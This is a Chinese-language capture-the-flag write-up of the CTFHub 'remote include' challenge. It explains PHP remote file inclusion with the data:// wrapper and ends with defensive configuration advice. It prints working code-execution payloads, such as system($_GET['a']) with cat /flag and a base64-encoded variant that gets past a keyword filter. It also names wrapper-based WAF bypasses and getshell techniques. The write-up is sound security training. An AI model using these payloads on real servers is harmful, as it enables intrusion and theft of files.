一、题目信息

  • 题目名称：远程包含
  • 题目平台：CTFHub 技能树
  • 题目类型：Web安全 / RCE / 远程文件包含（RFI）
  • 靶场链接：http://challenge-f9aef40b1bc08632.sandbox.ctfhub.com:10800（动态环境）
  • 涉及工具：Chrome浏览器

二、解题步骤

1. 分析题目考什么

本题的核心考点是远程文件包含（RFI）。后端使用 include() 包含用户可控的参数，并且服务器开启了 allow_url_include=On，允许包含远程 URL。由于服务器上没有预置木马文件，我们需要利用伪协议（data:// 或 http://）从外部注入恶意代码并执行。同时，源码中使用了 strpos() 过滤了 "flag" 字符，需要巧妙绕过。

2. 怎么想（破题思路）

  • 页面提示“没有 Shell，如何获取 Flag”，说明无法直接包含本地已有文件。
  • 源码中 !strpos($_GET['file'], "flag") 限制了 file 参数中不能出现 "flag" 字符。
  • 点击 phpinfo 确认 allow_url_include 为 On，这是远程包含的前提条件。
  • 尝试在本地搭建 HTTP 服务器（受限于沙盒网络，通常无法直接访问本地内网）。
  • 最优解：使用 PHP 内置的 data:// 伪协议。当遇到敏感词拦截时，采用“变量外置法”，将敏感词隐藏在另一个参数中。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：直接包含 /flag 被拦截

踩坑情况：尝试构造 ?file=data://text/plain,，页面直接弹出 Hacker!!!。

原因分析：源码中的 strpos($_GET['file'], "flag") 检测到了 file 参数中包含了 "flag" 字符串，因此触发拦截。

改进方式：不能将 "flag" 写在 file 参数里，需要将敏感词分离到其他参数中。

详细实操步骤（变量外置绕过法）

第一步：使用 data:// 执行探测命令

构造 Payload，利用 data:// 包含 PHP 代码查看根目录：

http://.../?file=data://text/plain,<?php system('ls /'); ?>

页面回显 flag 文件。

第二步：使用变量外置法读取 Flag

由于 file 参数不能包含 "flag"，我们将读取命令放到 a 参数中：

http://.../?file=data://text/plain,<?php system($_GET['a']); ?>&a=cat /flag

Payload 逐字深度解析：

  • ?file=data://：使用 data 伪协议，表明接下来的内容作为文件数据提供。
  • text/plain,：声明数据格式为纯文本，逗号后面跟着具体的数据内容。
  • <?php：PHP 脚本起始标记。
  • system：PHP 内置函数，用于执行外部系统命令。
  • $_GET['a']：PHP 超全局变量，用于接收 URL 中名为 a 的参数。
  • ; 和 ?>：PHP 语句结束和脚本结束标记。
  • &a=cat /flag：这是传递给 $_GET['a'] 的参数值，真正含有敏感词的 cat /flag 被巧妙地放在了这里，避开了 file 参数的过滤。

第三步：备选方案（Base64 编码法）

将 Payload 进行 Base64 编码：PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==，然后构造 URL：

http://.../?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==

由于 file 参数里全是乱码字符，strpos 找不到 "flag" 字符串，同样可以成功绕过。页面会直接回显 Flag。

4. 怎么迁移（跨领域联想）

  • 本地 RFI 组合利用：在实战中，如果目标无法执行代码，但存在文件上传漏洞，攻击者通常会先上传一个图片马，然后利用 RFI 包含该图片马（或配合 php://filter）实现 GetShell。
  • allow_url_include 的安全配置：生产环境中必须将该选项设置为 Off，这是防御 RFI 最有效的手段。若必须使用，应严格限制可包含的域名白名单。
  • WAF 绕过：当 WAF 拦截 data:// 或 http:// 时，可以尝试使用 php://input 结合 POST 请求，或使用 zip://、phar:// 等协议绕过。

三、名词大全与原理深度复盘

1. 远程文件包含（RFI）

RFI 是指服务器通过 include、require 等函数引入了外部 URL 指向的文件。当 allow_url_include=On 时，攻击者可以传入自己的恶意服务器地址，将木马代码注入到目标服务器执行。

2. data:// 伪协议

一种特殊的伪协议，允许将数据嵌入到 URL 中。格式为 data://text/plain,内容。如果 allow_url_include=On，PHP 会把 内容 当作文件内容进行包含执行。

3. strpos 过滤与逻辑绕过

strpos($str, "flag") 返回目标字符串在源字符串中的位置。如果找不到返回 false，找到则返回整数位置。!strpos(...) 的判断逻辑是：如果返回 0（即目标在开头），0 会被视为 false，!0 变为 true；如果返回非零，!数字 变为 false。本题中，我们通过变量外置或 Base64 编码，使得 file 参数内不含 "flag"，strpos 返回 false，!false 为 true，成功绕过过滤。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与本地文件包含（LFI）的区别：LFI 只能包含本地已有文件，依赖服务器预置木马或日志投毒；RFI 可直接引入外部代码，利用更灵活。
  • 与 php://input 的区别：php://input 是读取 POST 请求体，属于请求数据层；data:// 是将数据写在 URL 中，属于数据封装层。

2. 这种题目的出现原因

开发人员为了方便，在代码中使用了动态包含（如 include $_GET['file']），而运维人员未将 allow_url_include 配置关闭。默认情况下该配置为 Off，但在 CTF 环境中为了教学常被设为 On。这本质上是代码安全边界缺失与服务器配置不当的叠加。

3. 这种应用在实际中如何体现？

在真实渗透中，RFI 是直接获取服务器权限的“高速公路”。攻击者常利用它上传 C2 载荷，或结合端口转发进行内网渗透。防御 RFI 需要做到三点：关闭 allow_url_include、使用白名单限制包含路径、对用户输入进行过滤与转义。

4. 如何抽象理解概念（大白话理解）

把服务器比作一个餐厅：

  • 普通文件包含（LFI）：你说“把厨房里的某道菜端出来”，不能点菜单上没有的菜。
  • 远程文件包含（RFI）：餐厅允许你点“外卖”。你可以说“把我家门口那家店做的菜送进来”。
  • data:// 伪协议：你嫌外卖太远，干脆带了个饭盒，告诉餐厅“请把我的饭盒（URL里的数据）当作一道菜端上来”。
  • 变量外置/Base64：餐厅规定菜单上不能写“毒药”两个字。你灵机一动，对服务员说“请把我刚才说的那个词端上来”，或者把“毒药”写成一串暗号（Base64编码）。服务员没看到“毒药”两个字，就把东西端上来了。

做一道题，就要往自己脑子里装点东西。
